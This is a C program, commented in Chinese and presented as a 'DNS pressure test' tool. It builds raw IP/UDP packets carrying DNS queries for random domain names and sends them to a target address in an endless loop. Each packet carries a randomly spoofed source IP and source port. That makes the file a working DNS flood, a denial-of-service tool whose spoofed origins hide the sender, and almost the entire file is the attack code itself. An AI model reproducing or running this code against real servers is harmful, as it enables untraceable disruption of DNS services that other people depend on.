/*================================================================
*   Copyright (C) 2019 Renleilei. All rights reserved.
*   
*   文件名称：094_DNS_pressureTest.c
*   创 建 者：Renleilei (renleilei1992@foxmail.com)
*   创建日期：2019年03月06日
*   描    述：
*   版    本: Version 1.00
================================================================*/
#include <stdlib.h>
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/ip.h>
#include <linux/udp.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>
#include <string.h>
#include <unistd.h>

/*定义一个DNS首部的结构体*/
struct dnshdr {
	__be16 id;
	__be16 flags;
	__be16 questions;
	__be16 answer;
	__be16 auth;
	__be16 add;
};


int main(int argc, char *argv[])
{
	if (argc == 1)
	{
		printf("这是一个DNS压力测试工具，命令格式./DNStest ip port delay \n");
		exit(0);
	}
	else if (argc > 4)
	{
		printf("参数输入太多啦，请不带参数查看输入格式！\n");
		exit(0);
	}
	else if (argc < 4)
	{
		printf("参数输入太少啦，请不带参数查看输入格式！\n");
		exit(0);
	}

	struct sockaddr_in dstaddress;
	dstaddress.sin_family = AF_INET;
	dstaddress.sin_port = htons(atoi(argv[2]));
	dstaddress.sin_addr.s_addr = inet_addr(argv[1]);

	const int on = 1;
	int sk = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
	setsockopt(sk, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on));

	srand(clock());
	char buf[256] = { 0 };
	char dnsdata[128] = { 0 };
	struct iphdr *iphead;
	struct udphdr *udp;
	struct dnshdr *dns;
	/*下面是规定ip、udp、dns在buf中的开始位置*/
	iphead = (struct iphdr*)buf;
	udp = (struct udphdr*)(buf + sizeof(*iphead));
	dns = (struct udphdr*)(buf + sizeof(*iphead) + sizeof(*udp));
	/*下面是构造ip首部*/
	iphead->version = 4;
	iphead->ihl = sizeof(*iphead) / 4;
	iphead->tos = 0;

	iphead->id = 0;
	iphead->frag_off = 0;
	iphead->protocol = 17;
	iphead->check = 0;
	inet_aton(argv[1], &iphead->daddr);
	/*下面是构造udp首部，udp首部比较短，长度和源端口每次都可能变化所以放到后面的循环中了，upd校验和可以不计算直接置0*/
	udp->dest = htons(atoi(argv[2]));
	udp->check = 0;

	/*这是dns首部，问题记录数为1,当然也可以加多个问题，flags是那一大堆的标志位，不一个一个定义了，直接一起定义了*/
	dns->flags = htons(0x0100);
	dns->questions = htons(1);
	dns->answer = 0;
	dns->auth = 0;
	dns->add = 0;


	while (1)
	{
		dns->id = htons(rand() % 65535);/*dns的Id随机生成，每次都不一样*/
		int namelen = rand() % 6 + 2;/*这里是随机生成查询域名的长度我这写的是2-8个字符，当然可以随便改*/
		char p;
		p = (char)namelen;

		memcpy(buf + 40, &p, 1);
		int i = 0;
		char *pi = buf + 41;
		for (i = 0; i<namelen; i++)
		{
			int a = rand() % 26 + 97;/*这里是ascii码a-z随机生成*/
			char ca = (char)a;
			memcpy(pi, &ca, 1);
			pi++;
		}

		char *domain[] = { "com","edu","cn" };/*这是预先定义的顶级域，这里只写了三个，也可以继续添加，但是要后面dii的随机数范围*/
		int dii = rand() % 3;
		int domlen = strlen(domain[dii]);
		char cdomlen = (char)domlen;
		memcpy(buf + 41 + namelen, &cdomlen, 1);
		memcpy(buf + 42 + namelen, domain[dii], domlen);
		int zero = 0;
		char czero = (char)zero;
		memcpy(buf + 42 + namelen + domlen, &czero, 1);/*这是查询名最后的那个0*/
		int type_class = htonl(0x00010001);/*这里是查询类型和查询类都是1,为了方便直接写在一起了*/
		memcpy(buf + 43 + namelen + domlen, &type_class, 4);


		udp->len = htons(27 + namelen + domlen);
		udp->source = htons(rand() % 65535 + 1);
		int ip_len = 47 + namelen + domlen;
		iphead->tot_len = htons(ip_len);
		iphead->saddr = htonl((rand() % 3758096383));/*源ip随机，0-223.255.255.255,其实其中的192.168和172.16、10也都应该剔除，不过好麻烦我没弄*/
		iphead->ttl = random() % 98 + 30;

		sendto(sk, buf, ip_len, 0, &dstaddress, sizeof(struct sockaddr_in));/*这是发送我们构造的dns报文了，并不断循环*/
		usleep(atoi(argv[3]));/*这里是一个延时.用于方便调节发包速度，单位是百万分之一秒，不需要调节的话就把它注释掉，需要的话在第三个参数设定延时，不能是小数*/
	}
}
